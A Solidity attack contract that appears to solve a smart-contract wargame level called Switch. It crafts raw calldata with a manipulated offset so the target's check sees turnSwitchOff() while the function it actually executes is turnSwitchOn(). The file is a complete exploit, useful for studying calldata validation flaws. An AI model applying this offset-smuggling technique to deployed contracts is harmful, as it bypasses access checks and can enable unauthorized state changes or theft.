// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Switch.sol";

contract SwitchAttack {
    Switch target;

    constructor(address _target) {
        target = Switch(_target);
    }

    function run() public {
        // bytes4(keccak256("flipSwitch(bytes)"))
        bytes memory selector = hex"30c13ade";

        // points to the slot with a data
        bytes memory slot_000 = hex"0000000000000000000000000000000000000000000000000000000000000060";

        // helps to match a rule of copping calldata calldatacopy(selector, 68, 4)
        bytes memory slot_020 = hex"0000000000000000000000000000000000000000000000000000000000000000";

        // bytes4(keccak256("turnSwitchOff()"))
        bytes memory slot_040 = hex"20606e1500000000000000000000000000000000000000000000000000000000";

        // lenght of dynamic data
        bytes memory slot_060 = hex"0000000000000000000000000000000000000000000000000000000000000004";

        // bytes4(keccak256("turnSwitchOn()"))
        bytes memory slot_080 = hex"76227e1200000000000000000000000000000000000000000000000000000000";

        bytes memory data = abi.encodePacked(selector, slot_000, slot_020, slot_040, slot_060, slot_080);
        target.flipSwitch(data);
    }
}
